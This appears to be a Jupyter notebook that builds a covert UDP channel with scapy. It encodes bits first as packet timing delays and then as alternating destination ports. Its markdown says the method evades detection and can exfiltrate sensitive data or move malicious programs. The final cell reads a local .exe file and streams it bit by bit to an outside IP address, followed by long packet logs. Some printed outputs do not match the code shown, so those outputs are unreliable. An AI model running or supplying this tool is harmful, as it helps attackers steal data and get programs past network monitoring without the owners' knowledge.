# %% [markdown]
# ## UDP Send with Time Delay Based Phase Shift

# %%
from scapy.all import Ether, IP, UDP, send, sendp
import time
mac_adapter="c4:03:a8:d1:a6:82"
ip_wifi="172.20.7.186"
target_ip = "172.20.7.187"

def text_to_binary(text):
    binary_result = ''.join(format(ord(char), '08b') for char in text)
    return binary_result[0] + binary_result + '0' #this method looses the first bit, which needs a repeat

def send_packets(target_ip, data, target_port=12345, base_interval=0.25):
    """
    Send UDP packets using phase modulation to a target IP.

    Args:
    target_ip (str): IP address of the target.
    data (str): Binary data where '0' = no shift, '1' = phase shift.
    target_port (int): Target port number for UDP packets.
    base_interval (float): Base interval in seconds between packets.
    """
    last_time = time.time()
    
    for bit in data:
        if bit == '1':
            # Introduce a phase shift by delaying the packet
            time.sleep(base_interval * 1.5)
        else:
            time.sleep(base_interval)
        
        # Send a simple UDP packet
        send(IP(dst=target_ip)/UDP(dport=target_port), verbose=False)
        print(f"Sent UDP packet for bit '{bit}' at {time.time() - last_time:.2f}s interval")
        last_time = time.time()


data_text="cat"
binary_data= text_to_binary(data_text)
print(binary_data)
send_packets(target_ip, binary_data)
# Out:
# 00110001101100001011101000
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '1' at 0.38s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '0' at 0.25s interval
# Sent UDP packet for bit '0' at 0.25s interval

# %% [markdown]
# ## Phase Shift by Port Number
# but you can see that data is even more awkward. I like the clean methods. Now let's use ports, so it also breaks the session construct used by detections.

# %%
from scapy.all import IP, UDP, send
import time

mac_adapter="c4:03:a8:d1:a6:82"
ip_wifi="172.20.7.186"
target_ip = "104.42.239.27"

def text_to_binary(text):
    binary_result = ''.join(format(ord(char), '08b') for char in text)
    return binary_result + '0' 


def send_packets(target_ip, data, base_port=12345):
    """
    Send UDP packets using different ports to simulate phase modulation.

    Args:
    target_ip (str): IP address of the target.
    data (str): Binary data where '0' = base_port, '1' = base_port + 1.
    """
    port_mapping = {'0': base_port, '1': base_port + 1}

    for bit in data:
        port = port_mapping[bit]
        packet = IP(dst=target_ip)/UDP(sport=666, dport=port)
        send(packet, verbose=False)
        print(f"Sent UDP packet to port {port} for bit '{bit}'")
        time.sleep(0.1)  # Delay to simulate time between transmissions

# Example usage:
data_text="ironcat is eternal"
binary_data= text_to_binary(data_text)
print(binary_data)
send_packets(target_ip, binary_data)
# Out:
# WARNING: Wireshark is installed, but cannot read manuf !
# 0110001101100001011101000
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'

# %% [markdown]
# ## Binary Transmission
# Any data, regardless of the likely hood it may have detections available can be transmitted over the network with out detection.  No encryption schema is required, and no overhead of using encyrpted protocols.  So any hole, anywhere in your environemnt can be used to exfiltrate sensitive data, or transfer malicious programs, with no prep from the attacker.

# %%
from scapy.all import IP, UDP, send
import time
import os

mac_adapter="c4:03:a8:d1:a6:82"
ip_wifi="172.20.7.186"
target_ip = "104.42.239.27"
print("Current Working Directory: ", os.getcwd())



def file_to_binary(file_path):
    try:
        # Open the file in binary read mode
        with open(file_path, 'rb') as file:
            binary_data = file.read()  # Read the entire file as bytes

        # Convert each byte to its binary representation
        binary_string = ''.join(format(byte, '08b') for byte in binary_data)
        return binary_string
    except FileNotFoundError:
        print("File not found. Please check the path and try again.")
        return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None


def send_packets(target_ip, data, base_port=12345):
    """
    Send UDP packets using different ports to simulate phase modulation.

    Args:
    target_ip (str): IP address of the target.
    data (str): Binary data where '0' = base_port, '1' = base_port + 1.
    """
    port_mapping = {'0': base_port, '1': base_port + 1}

    for bit in data:
        port = port_mapping[bit]
        packet = IP(dst=target_ip)/UDP(sport=666, dport=port)
        send(packet, verbose=False)
        print(f"Sent UDP packet to port {port} for bit '{bit}'")
        time.sleep(0.01)  # Delay to simulate time between transmissions

# Example usage:
mac_adapter="c4:03:a8:d1:a6:82"
ip_wifi="172.20.7.186"
target_ip = "104.42.239.27"
file_path = "c:\\1-ironcat\\iaiprv1.exe"
print(file_path)
binary_data = file_to_binary(file_path)

send_packets(target_ip, binary_data)
# Out:
# WARNING: Wireshark is installed, but cannot read manuf !
# Current Working Directory:  f:\quatumcat-5-5
# c:\1-ironcat\iaiprv1.exe
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12346 for bit '1'
# Sent UDP packet to port 12345 for bit '0'
# Sent UDP packet to port 12345 for bit '0'
